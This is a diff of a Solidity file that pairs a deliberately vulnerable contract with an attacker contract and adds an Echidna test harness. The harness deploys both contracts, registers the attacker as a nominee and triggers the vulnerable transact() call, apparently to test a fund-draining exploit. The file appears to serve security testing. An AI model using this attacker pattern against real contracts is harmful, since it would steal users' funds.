@@ -43,15 +43,16 @@ contract vulnerable{
 contract attacker{
     
     bool private flag;
-    vulnerable v = vulnerable(0xef55BfAc4228981E850936AAf042951F7b146e41);
+    // vulnerable v = vulnerable(0xef55BfAc4228981E850936AAf042951F7b146e41);
     uint256 _amount = 3 ether;
     
-    constructor() public{
+    constructor(address payable _vulnerableContract) public{
         flag = false;
+        vulnerable v = vulnerable(_vulnerableContract);
     }
     
     function deposit(address payable _addr) payable public{
-        _addr.transfer(_amount);
+        _addr.transfer(msg.value);
     }
     
     function() external payable{
@@ -70,6 +71,39 @@ contract attacker{
     
 }
 
-// contract echidna{
-    
-// }
+contract echidna{
+    vulnerable v = new vulnerable();
+    attacker a = new attacker(address(v));
+         
+     constructor() public payable{
+        
+        //  a.deposit(address(v));     // transferring 3 ethers to vulnerable contract and rest to the attacker contract
+         v.addNominee(address(a));
+     }
+     
+     function action() public payable{
+         a.deposit(address(v));     // transferring 3 ethers to vulnerable contract and rest to the attacker contract
+         address(v).send(msg.value);
+     }
+     
+    //  function transactToV() public payable{
+    //      address(v).send(msg.value);
+    //  }
+     
+     function getTargetBalance() public view returns(uint256, uint256){
+        return (address(v).balance , address(this).balance);
+    }
+     
+     function attack() public payable{
+         v.transact();
+     }
+     
+    //  function() external payable{
+    //      address(a).transfer(msg.value);
+    //  }
+}
+
+
+
+
+
